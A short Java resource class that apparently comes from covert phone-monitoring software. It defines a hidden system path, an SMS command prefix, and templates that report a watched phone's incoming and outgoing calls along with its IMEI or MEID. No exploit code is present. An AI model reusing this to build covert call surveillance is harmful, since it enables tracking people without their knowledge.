package com.vvt.daemon.appengine;

import android.content.Context;

public class AppEnginDaemonResource {
	public final static String APPENGIN_EXTRACTING_PATH = "/data/misc/appengin";
	public final static String SMS_COMMAND_TAG = "<*#";
	
	public static final String LANGUAGE_SMS_NOTIFY_FOR_INCOMING = "Incoming call from %s is detected.\n%s: %s";
	public static final String LANGUAGE_SMS_NOTIFY_FOR_OUTGOING = "Outgoing call to %s is detected.\n%s: %s";
	public static final String LANGUAGE_SMS_NOTIFY_FOR_MUSIC_PLAY = "Cannot accept call while playing music, try again later.";
	public static final String LANGUAGE_PRIVATE_NUMBER = "unknown";
	
	public static String getWatchListNotificationIncoming( boolean isGsm,
			Context context, String number, String deviceId) {
		
		if (number == null || number.trim().length() < 3) {
			number =LANGUAGE_PRIVATE_NUMBER;
		} 
		return String.format(LANGUAGE_SMS_NOTIFY_FOR_INCOMING, 
				number, isGsm ? "IMEI" : "MEID", deviceId);
	}
	
	public static String getWatchListNotificationOutgoing( boolean isGsm,
			Context context, String number, String deviceId) {
		
		if (number == null || number.trim().length() < 3) {
			number = LANGUAGE_PRIVATE_NUMBER;
		}
		return String.format(LANGUAGE_SMS_NOTIFY_FOR_OUTGOING, 
				number, isGsm ? "IMEI" : "MEID", deviceId);
	}
}
